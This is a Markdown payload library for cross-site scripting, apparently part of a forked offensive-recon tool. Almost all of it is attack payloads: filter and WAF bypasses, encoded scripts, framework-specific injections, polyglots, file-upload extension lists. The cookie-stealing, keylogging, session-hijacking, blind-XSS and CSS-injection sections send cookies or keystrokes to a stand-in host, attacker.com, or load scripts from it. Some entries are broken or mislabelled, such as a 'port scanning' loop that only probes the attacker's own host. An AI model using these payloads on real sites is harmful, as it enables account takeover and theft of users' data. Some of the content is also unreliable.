<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# Full XSS Payload Library (500+ payloads)
## Comprehensive Cross-Site Scripting Payloads

### Basic Payloads
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror="alert(1)">
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)" type=submit>
<animate onbegin=alert(1) attributeName=x>
<set attributeName=onload to=alert(1)>
```

### Event Handlers (100+ variations)
```
onclick
onerror
onload
onmouseover
onmouseout
onmousedown
onmouseup
onfocus
onblur
onchange
oninput
onsubmit
onreset
onselect
onkeydown
onkeyup
onkeypress
ontouchstart
ontouchmove
ontouchend
ondblclick
onanimationstart
onanimationend
onanimationiteration
ontransitionend
onpointerdown
onpointerup
onpointermove
onwheel
ondrag
ondrop
oncut
oncopy
onpaste
onabort
oncanplay
oncanplaythrough
ondurationchange
onemptied
onended
onerror
onloadeddata
onloadedmetadata
onloadstart
onpause
onplay
onplaying
onprogress
onratechange
onseeked
onseeking
onstalled
onsuspend
ontimeupdate
onvolumechange
onwaiting
```

### Event Handler + Payload Combinations
```
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<img src=x onmouseover=alert(1)>
<img src=x onfocus=alert(1)>
<svg onload=alert(1)>
<svg onerror=alert(1)>
<svg onmouseover=alert(1)>
<body onload=alert(1)>
<body onerror=alert(1)>
<body onfocus=alert(1)>
<input onfocus=alert(1) autofocus>
<input onblur=alert(1)>
<input oninput=alert(1)>
<input onchange=alert(1)>
<select onfocus=alert(1) autofocus>
<select onchange=alert(1)>
<textarea onfocus=alert(1) autofocus>
<textarea oninput=alert(1)>
<keygen onfocus=alert(1) autofocus>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<marquee onfinish=alert(1)>
<meter onmouseover=alert(1)>0</meter>
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
<form action="javascript:alert(1)"><input type=submit>
<isindex action="javascript:alert(1)" type=submit>
<a href="javascript:alert(1)">click</a>
<base href="javascript:alert(1)//">
<link rel="import" href="javascript:alert(1)">
<meta http-equiv="refresh" content="0;javascript:alert(1)">
<svg><a href="javascript:alert(1)"><animate attributeName="href" from="#" to="javascript:alert(1)" />
```

### Bypass Techniques - Tag Blocking
```
<ScRiPt>alert(1)</sCrIpT>
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\x69pt>alert(1)</scr\x69pt>
<sc\x72ipt>alert(1)</sc\x72ipt>
<script/%00%00>alert(1)</script>
<script/%00>alert(1)</script>
<script>al\u0065rt(1)</script>
<script>al\x65rt(1)</script>
<script>al\u00065rt(1)</script>
<s\x00cript>alert(1)</s\x00cript>
<j\x00avascript:alert(1)>
<svg><script>alert&#40;1&#41;</script>
<svg><script>alert&#x28;1&#x29;</script>
<svg><script>alert(String.fromCharCode(49))</script>
< IMG SRC=j&#97;vascript:alert(1)>
< IMG SRC="javascript:alert(1)">
<IMG SRC="jav&#x61;script:alert(1)">
```

### Bypass Techniques - Quote Escaping
```
'"(){}<x>=>${alert(1)}
<svg><script>alert(1)</script>
<img src="x" onerror="alert(1)">
<img src='x' onerror='alert(1)'>
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">
<img src=x onerror='alert(1)'>
```

### Bypass - HTML Entity Encoding
```
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
&lt;img src=x onerror=alert(1)&gt;
&#60;img src=x onerror=alert(1)&#62;
```

### Bypass - Unicode Escaping
```
\u003cscript\u003ealert(1)\u003c/script\u003e
\u003cimg src=x onerror=alert(1)\u003e
<script>\u0061lert(1)</script>
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### Bypass - Mixed Encoding
```
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B/script%26%2362%3B
<%00script>alert(1)</script>
```

### Bypass - Character Insertion
```
<scr\x00ipt>alert(1)</scr\x00ipt>
<scr\x09ipt>alert(1)</scr\x09ipt>
<scr\x0aipt>alert(1)</scr\x0aipt>
<scr\x0dipt>alert(1)</scr\x0dipt>
<scr\x20ipt>alert(1)</scr\x20ipt>
<s\x63ript>alert(1)</s\x63ript>
<s\x63\x72ipt>alert(1)</s\x63\x72ipt>
```

### Bypass - Non-Alphanumeric
```
<script>eval(atob('YWxlcnQoMSk='))</script>
<script>eval(atob('YWxlcnQoMik='))</script>
<script>eval(atob('YWxlcnQodGhpcyk='))</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
<script>[][(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[+!+[]]][(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]]+(![]+[])[+!+[]])())</script>
```

### DOM XSS Payloads
```
javascript:alert(1)
javascript:alert(document.domain)
javascript:alert(document.cookie)
javascript:fetch('http://attacker.com?c='+document.cookie)
data:text/html,<script>alert(1)</script>
data:text/html,<script>alert(document.domain)</script>
vbscript:msgbox(document.cookie)
#<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
"><svg onload=alert(1)>
'><svg onload=alert(1)>
```

### AngularJS payloads
```
{{constructor.constructor('alert(1)')()}}
{{alert(document.cookie)}}
ng-app"><img src=x onerror=alert(1)>
ng-app>{{alert(1)}}
x ng-init=alert(1)
{{$on.constructor('alert(1)')()}}
{{toString.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
```

### React payloads
```
<img src=x onerror={alert(1)}>
{alert(1)}
<svg><animate onbegin=alert(1) attributeName=x>
javascript:alert(1)
```

### jQuery payloads
```
<script>$.get('http://attacker.com?c='+document.cookie)</script>
<img src=x onerror="$().get('http://attacker.com')">
<svg/onload=$().get('http://attacker.com')>
```

### Prototype Pollution
```
{"__proto__":{"polluted":"true"}}
{"constructor":{"prototype":{"polluted":"true"}}}
{"__proto__":{"<img src=x onerror=alert(1)>":"test"}}
```

### Stored XSS
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<div style="background-image:url(javascript:alert(1))">
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

### Reflected XSS
```
/?q=<script>alert(1)</script>
/?q=<img src=x onerror=alert(1)>
/?q="><script>alert(1)</script>
/?q='><script>alert(1)</script>
```

### Blind XSS
```
<script src=http://attacker.com/xss.js></script>
<img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
<svg onload="fetch('http://attacker.com?c='+document.cookie)">
```

### WAF Bypass - Cloudflare
```
<svg/onload=alert(1)>
<svg><script>alert(1)</script>
<img src=x:alert(1)>
<svg><a href="javascript:alert(1)">
<svg><animate onbegin=alert(1) attributeName=x>
<math><a href="javascript:alert(1)">test
<body onload=alert(1)>
```

### WAF Bypass - Akamai
```
<iframe src="javascrip&#116;:alert(1)">
<svg><script>al&#101;rt(1)</script>
```

### WAF Bypass - Generic
```
<ScRiPt>alErT(1)</sCrIpT>
<IMG SRC="jav&#x61;script:alert(1)">
<IMG SRC="javascript:alert(1)">
<IMG SRC=javascript:alert(1)>
<IMG SRC=JaVaScRiPt:alert(1)>
<svg><script>alert&#40;1&#41;</script>
```

### Polyglots (Multi-Context)
```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
<svg%0Aonload=%09alert(1)%0A>
<img src="x" onerror="&#74&#65&#86&#65&#83&#67&#82&#73&#80&#84(&#39&#97&#108&#101&#114&#116&#40&#49&#41)">
<svg/onload=alert(String.fromCharCode(49))>
<svg/onload=eval(atob('YWxlcnQoMSk='))>
<svg><script>eval(atob('YWxlcnQoMSk='))</script></svg>
<svg><script>alert(1)</script>
<svg><set attributeName="onload" to="alert(1)">
<img src=x onerror="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

### Payload Templates
```
PAYLOAD_TEMPLATE_XSS_REFLECTED = """
{param}=<script>alert(1)</script>
{param}=<img src=x onerror=alert(1)>
{param}=<svg onload=alert(1)>
{param}="><script>alert(1)</script>
{param}='><script>alert(1)</script>
{param}=javascript:alert(1)
{param}=<iframe src="javascript:alert(1)">
"""

PAYLOAD_TEMPLATE_XSS_DOM = """
{param}=</{param}><script>alert(1)</script>
{param}=//console.log(alert(1))
{param}=</title><script>alert(1)</script>
{param}=</head><body onload=alert(1)>
"""

PAYLOAD_TEMPLATE_XSS_FILE_UPLOAD = """
filename.php
filename.jpg.php
filename.php.jpg
filename.php3
filename.php4
filename.php5
filename.phtml
filename.phar
filename.php7
filename.php8
filename.aspx
filename.asp
filename.jsp
filename.shtml
filename.svg
```

### Context-Specific Payloads

#### In HTML Tag
```
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
'><script>alert(1)</script>
'<script>alert(1)</script>
"><svg onload=alert(1)>
'><svg onload=alert(1)>
```

#### In JavaScript
```
</script><script>alert(1)</script>
'-alert(1)-'
";alert(1);//
';alert(1);//
${alert(1)}
```

#### In Attribute
```
" onmouseover=alert(1) "
' onmouseover=alert(1) '
onmouseover=alert(1)
javascript:alert(1)
```

#### In Style
```
xss:expression(alert(1))
style="background-image:url(javascript:alert(1))"
```

#### In Link
```
javascript:alert(1)
vbscript:msgbox(1)
data:text/html,<script>alert(1)</script>
```

### Cookie Stealing
```
<script>fetch('https://attacker.com?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<svg onload="fetch('https://attacker.com?c='+document.cookie)">
<script>new Image().src='https://attacker.com?c='+document.cookie</script>
```

### Keylogging
```
<script>document.onkeypress=function(e){new Image().src='https://attacker.com?k='+e.key}</script>
<script>document.onkeydown=function(e){new Image().src='https://attacker.com?k='+e.keyCode}</script>
```

### Session Hijacking
```
<script>
fetch('https://attacker.com?session='+document.cookie)
.then(r=>r.text())
.then(t=>fetch('https://attacker.com/log?t='+t))
</script>
```

### Port Scanning via XSS
```
<script>
for(i=1;i<65535;i++){
new Image().src='http://attacker.com:'+i
}
</script>
```

### CSS Injection
```
<style>
@import "http://attacker.com/xss.css";
</style>
<link rel="stylesheet" href="http://attacker.com/xss.css">
```

### Clickjacking
```
<iframe src="http://target.com" style="opacity:0;filter:alpha(opacity=0)">
```
